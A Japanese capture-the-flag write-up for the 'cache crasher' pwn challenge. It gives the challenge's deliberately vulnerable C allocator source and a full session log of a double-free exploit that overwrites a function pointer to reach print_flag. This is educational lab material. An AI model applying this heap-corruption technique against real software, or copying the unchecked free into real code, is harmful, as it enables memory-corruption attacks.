# cache crasher:Pwn:100pts
tapioca rice  

[cache-crasher.c](cache-crasher.c)　[cache](cache)  

`nc 34.170.146.252 45969`  

# Solution
CソースとELFが配布される。  
ソースは以下の通りであった。  
```c
#include <stddef.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>

#define MAX_ALLOC 0x10

union chunk {
  union chunk* next_chunk;
  size_t val;
};

size_t alloced = 0;
union chunk buf[MAX_ALLOC];
union chunk* cache = NULL;
union chunk* allocate() {
  size_t a = sizeof(union chunk);

  union chunk* res;
  if (cache != NULL) {
    res = cache;
    cache = res->next_chunk;
  }
  else {
    if (MAX_ALLOC <= alloced) return NULL; // buf exhausted
    res = &buf[alloced];
    alloced++;
  }

  return res;
}

void free_chunk(union chunk* ptr) {
  ptr->next_chunk = cache;
  cache = ptr;
}

void print_flag() {
  char flag[256];
  int fd = open("./flag.txt", O_RDONLY);
  if (fd < 0) { puts("./flag.txt not found"); return; }
  write(1, flag, read(fd, flag, sizeof(flag)));
}

void dump_info() { // You don't need to read this function!
  printf("Cache:\n");
  union chunk* current = cache; int limit = 5;
  while (buf <= current && current < &buf[MAX_ALLOC]) {
    printf("%p -> ", (void*)current);
    current = current->next_chunk;
    if (--limit == 0) { printf("...\n"); break; }
  }
  if (limit != 0) printf("%p\n", (void*)current);
  printf("Buffer:\n");
  for (size_t i = 0; i < alloced; i++) printf("buf[%zu]: %p (val: 0x%lx)\n", i, (void*)&buf[i], buf[i].val);
}

void (*funcptr)() = dump_info;

#define ALLOC 0
#define FREE  1
int main() {
  setbuf(stdout, NULL);
  printf("address of print_flag: %p\n", print_flag);
  printf("address of funcptr: %p\n", &funcptr);

  int i = 0;
  union chunk* s[MAX_ALLOC];

  int opcode;
  while (1) {
    printf("opcode(0: alloc, 1: free): ");
    if (scanf("%d", &opcode) == EOF) break;
    if (opcode == ALLOC) {
      size_t val;
      s[i] = allocate();
      if (s[i] == NULL) { perror("allocate failed"); exit(1); } 
      printf("data(integer): ");
      if (scanf("%zu", &val) == EOF) break;
      s[i]->val = val;
      i++;
    }
    else {
      size_t ind;
      printf("what index to free: ");
      if (scanf("%zu", &ind) == EOF) break;
      if (ind < 0 || i <= ind) { perror("invalid operand"); exit(1); }
      free_chunk(s[ind]);
    }

    printf("content of funcptr: %p\n", funcptr);
    funcptr();
  }
}
```
最初に`print_flag`のアドレスと`funcptr`のアドレスを表示し、独自のキャッシュを用いたオレオレ`alloc`と`free`を行えるようだ。  
毎回`funcptr`に保存されている`dump_info`が実行されている。  
これをどうにか`print_flag`に書き換えろとのことらしい。  
昔の__free_hookがあった時代の簡単heap問を思い出す。  
double freeで循環のチャンクを作って、`alloc`して書き換えればよいとわかる。  
一度`alloc`しなければ`i`が増えないので`free`できないことと、各種アドレスはHexではなく数値入力であることに注意する。  
以下のように行う。  
```bash
$ nc 34.170.146.252 45969
address of print_flag: 0x40222e
address of funcptr: 0x405150
opcode(0: alloc, 1: free): 0
data(integer): 999
content of funcptr: 0x4022a2
Cache:
(nil)
Buffer:
buf[0]: 0x4051a0 (val: 0x3e7)
opcode(0: alloc, 1: free): 1
what index to free: 0
content of funcptr: 0x4022a2
Cache:
0x4051a0 -> (nil)
Buffer:
buf[0]: 0x4051a0 (val: 0x0)
opcode(0: alloc, 1: free): 1
what index to free: 0
content of funcptr: 0x4022a2
Cache:
0x4051a0 -> 0x4051a0 -> 0x4051a0 -> 0x4051a0 -> 0x4051a0 -> ...
Buffer:
buf[0]: 0x4051a0 (val: 0x4051a0)
opcode(0: alloc, 1: free): 0
data(integer): 4215120
content of funcptr: 0x4022a2
Cache:
0x4051a0 -> 0x405150
Buffer:
buf[0]: 0x4051a0 (val: 0x405150)
opcode(0: alloc, 1: free): 0
data(integer): 888
content of funcptr: 0x4022a2
Cache:
0x405150
Buffer:
buf[0]: 0x4051a0 (val: 0x378)
opcode(0: alloc, 1: free): 0
data(integer): 4203054
content of funcptr: 0x40222e
Alpaca{ar1g4t0u_alloc4t0r}
opcode(0: alloc, 1: free): ^C
```
うまく`print_flag`が実行され、flagが得られた。  

## Alpaca{ar1g4t0u_alloc4t0r}